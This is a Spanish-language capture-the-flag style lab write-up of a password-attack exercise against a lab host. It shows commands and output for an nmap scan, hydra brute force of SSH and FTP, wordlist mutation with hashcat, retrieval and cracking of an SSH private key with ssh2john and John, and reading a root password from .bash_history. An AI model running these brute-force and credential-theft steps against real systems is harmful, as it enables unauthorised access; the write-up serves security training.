
# Lab de contraseñas - Easy

La empresa implementó recientemente controles de seguridad relacionados con la autorización que les gustaría que probáramos. Hay tres hosts dentro del alcance de esta evaluación. El primer host se utiliza para administrar y gestionar otros servidores dentro de su entorno.

***

## <mark style="color:purple;">Objetivo</mark>

> Examina el primer objetivo y envía la contraseña de root como respuesta.

## <mark style="color:purple;">Escaneo de puertos</mark>

```bash
sudo nmap -v -sV -T5 10.129.202.219              
 
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
```

Solamente tiene abiertos los puertos 21 y 22, por lo que centraremos nuestros bruteforce contra estos servicios.

## <mark style="color:purple;">Bruteforce de SSH</mark>

Como ya hemos visto en esta sección, tenemos `2 diccionarios`:&#x20;

* `username-list`: Diccionario de usuarios
* `password.list`: Diccionario de contraseñas

Vamos a lanzar el bruteforce contra SSH y el usuario `root`:

```shell-session
hydra -l root -P password.list ssh://10.129.202.219 -t 48 -I
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-04-19 15:19:09
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 48 tasks per 1 server, overall 48 tasks, 203 login tries (l:1/p:203), ~5 tries per task
[DATA] attacking ssh://10.129.202.219:22/
1 of 1 target completed, 0 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-04-19 15:20:01
```

Hydra no consigue hacer bruteforce con el diccionario normal, asi que vamos a mutarlo con hashcat:

```bash
hashcat --force password.list -r custom.rule --stdout | sort -u > mut_password.list
```

Volvemos a lanzar el bruteforce pero hydra no consigue descifrar ningún usuario ni contraseña válido, por lo que vamos a atacar el otro servicio activo: FTP

## <mark style="color:purple;">Bruteforce de FTP</mark>

```bash
hydra -L username.list -P password.list ftp://10.129.202.219 -t 48 -I 
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-04-19 15:36:21
[DATA] max 48 tasks per 1 server, overall 48 tasks, 21112 login tries (l:104/p:203), ~440 tries per task
[DATA] attacking ftp://10.129.202.219:21/
[STATUS] 810.00 tries/min, 810 tries in 00:01h, 20302 to do in 00:26h, 48 active
[STATUS] 736.33 tries/min, 2209 tries in 00:03h, 18903 to do in 00:26h, 48 active
[STATUS] 728.71 tries/min, 5101 tries in 00:07h, 16011 to do in 00:22h, 48 active
[STATUS] 718.25 tries/min, 8619 tries in 00:12h, 12493 to do in 00:18h, 48 active
[STATUS] 714.47 tries/min, 12146 tries in 00:17h, 8972 to do in 00:13h, 42 active
[21][ftp] host: 10.129.202.219   login: mike   password: 7777777
```

Y bummmm! Conseguimos las credenciales del usuario `Mike`. Al conectarnos por FTP nos encontramos varios `id_rsa` para conectarnos por ssh y un `authorized_keys` que puede contener información relevante:

```bash
ftp mike@10.129.202.219
Connected to 10.129.202.219.
220 (vsFTPd 3.0.3)
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||6594|)
150 Here comes the directory listing.
-rw-rw-r--    1 1000     1000          554 Feb 09  2022 authorized_keys
-rw-------    1 1000     1000         2546 Feb 09  2022 id_rsa
-rw-r--r--    1 1000     1000          570 Feb 09  2022 id_rsa.pub
226 Directory send OK.
ftp> 
```

```bash
ftp> get id_rsa
local: id_rsa remote: id_rsa
229 Entering Extended Passive Mode (|||58313|)
150 Opening BINARY mode data connection for id_rsa (2546 bytes).
100% |***********************|  2546        2.13 MiB/s    00:00 ETA
226 Transfer complete.
2546 bytes received in 00:00 (82.83 KiB/s)
ftp> get id_rsa.pub
local: id_rsa.pub remote: id_rsa.pub
229 Entering Extended Passive Mode (|||59497|)
150 Opening BINARY mode data connection for id_rsa.pub (570 bytes).
100% |***********************|   570        8.49 MiB/s    00:00 ETA
226 Transfer complete.
570 bytes received in 00:00 (11.73 KiB/s)
ftp> get authorized_keys
local: authorized_keys remote: authorized_keys
229 Entering Extended Passive Mode (|||10439|)
150 Opening BINARY mode data connection for authorized_keys (554 bytes).
100% |***********************|   554       11.37 KiB/s    00:00 ETA
226 Transfer complete.
554 bytes received in 00:00 (7.02 KiB/s)
ftp> 
```

## <mark style="color:purple;">Conexión por SSH</mark>

Ahora que tenemos los archivos en nuestra máquina de atacante, vamos a intentar conectarnos por SSH:

<pre class="language-shell-session"><code class="lang-shell-session"><strong>afsh4ck@kali$ ssh mike@10.129.202.219          
</strong>mike@10.129.202.219: Permission denied (publickey).
</code></pre>

Al intentar conectarnos por SSH nos dice permission denied, por lo que necesitamos conectarnos a través del id\_rsa:

```shell-session
afsh4ck@kali$ ssh -i id_rsa mike@10.129.202.219

The authenticity of host '10.129.202.219 (10.129.202.219)' can't be established.
ED25519 key fingerprint is SHA256:AtNYHXCA7dVpi58LB+uuPe9xvc2lJwA6y7q82kZoBNM.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:11: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.202.219' (ED25519) to the list of known hosts.
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
Permissions 0644 for 'id_rsa' are too open.
It is required that your private key files are NOT accessible by others.
This private key will be ignored.
Load key "id_rsa": bad permissions
mike@10.129.202.219: Permission denied (publickey).
```

Nos dice que los permisos del id\_rsa son muy abiertos, entonces vamos a limitarlos:

```bash
sudo chmod 500 id_rsa

ssh -i id_rsa mike@10.129.202.219    
Enter passphrase for key 'id_rsa': 
```

## <mark style="color:purple;">Cracking con ssh2john</mark>

Igualmente nos pide el passphrase, por lo que vamos a crackear este id\_rsa con `ssh2john` y John the Ripper para intentar extraer la contraseña en plano:

```bash
ssh2john id_rsa > ssh.hash 
```

```bash
john --wordlist=mut_password.list ssh.hash 

Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
7777777          (id_rsa) 
```

Ahora que tenemos el passphrase vamos a conectarnos por SSH:

<pre class="language-shell-session"><code class="lang-shell-session"><strong>afsh4ck@kali$ ssh -i id_rsa mike@10.129.202.219
</strong>Enter passphrase for key 'id_rsa': 
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-99-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon Apr 22 07:53:52 BST 2024

  System load:  0.0               Processes:               163
  Usage of /:   30.8% of 8.79GB   Users logged in:         0
  Memory usage: 10%               IPv4 address for ens192: 10.129.202.219
  Swap usage:   0%

 * Super-optimized for small spaces - read how we shrank the memory
   footprint of MicroK8s to make it the smallest full K8s around.

   https://ubuntu.com/blog/microk8s-memory-optimisation

214 updates can be applied immediately.
165 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Wed Feb  9 17:37:10 2022 from 10.129.202.64
mike@skills-easy:~$ 
</code></pre>

## <mark style="color:purple;">Enumeración</mark>

Una vez que estamos dentro vamos a empezar a enumerar información, por ejemplo el historial de la terminal:

```shell-session
mike@skills-easy:~$ la
.bash_history  .bash_logout  .bashrc  .cache  .profile  .ssh  .viminfo

mike@skills-easy:~$ cat .bash_history
vim updater.bash
bash updater.bash 
vim updater.bash
apt-cache search gem
sudo gem install -V lolcat
sudo apt-get install fortune
analysis.py -u root -p dgb6fzm0ynk@AME9pqu
```

Como vemos, obtenemos la contraseña del usuario root, almacenada en el historial de la terminal 🏆

```
User: root
Pass: dgb6fzm0ynk@AME9pqu
```

## <mark style="color:purple;">Escalada de privilegios</mark>

```bash
mike@skills-easy:~$ su root
Password: 
root@skills-easy:/home/mike# whoami
root
```
